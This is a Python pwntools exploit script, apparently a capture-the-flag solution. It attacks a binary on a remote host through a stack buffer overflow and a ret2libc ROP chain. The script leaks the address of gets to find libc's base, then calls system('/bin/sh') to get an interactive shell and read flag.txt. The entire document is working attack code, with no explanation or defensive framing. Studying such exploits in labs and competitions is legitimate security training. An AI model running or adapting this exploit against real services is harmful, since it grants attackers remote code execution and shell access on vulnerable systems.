from pwn import *

context.binary = binary = "./xxxx"
context.log_level = "info"

elf = ELF(binary)
rop = ROP(elf)
libc = ELF("libc6_2.31-0ubuntu9.9_amd64.so")

padding = b"A" * 40
pop_rdi_ret = rop.find_gadget(["pop rdi","ret"])[0]
got_plt = elf.got["gets"]
puts_plt = elf.plt["puts"]

payload = padding
payload += p64(pop_rdi_ret)
payload += p64(got_plt)
payload += p64(puts_plt)
payload += p64(elf.symbols["main"])

io = remote("xx.xx.xx.xx",9999)
io.recvuntil("This time no ğŸ—‘ï¸ ğŸ¤« & ğŸˆğŸš©.ğŸ“„ Go ahead ğŸ˜")
io.sendline(payload)
io.recvline()
leak = u64(io.recvline().strip().ljust(8,b"\x00"))
io.recvline()
log.info(f"Gets Leak => {hex(leak)}")
libc.address = leak - libc.symbols["gets"]
log.info(f"Libc Base => {hex(libc.address)}")

payload2 = padding
payload2 += p64(pop_rdi_ret)
payload2 += p64(next(libc.search(b"/bin/sh")))
payload2 += p64(rop.find_gadget(["ret"])[0])
payload2 += p64(libc.symbols["system"])

io.sendline(payload2)
io.sendline(b"cat flag.txt")
io.interactive()
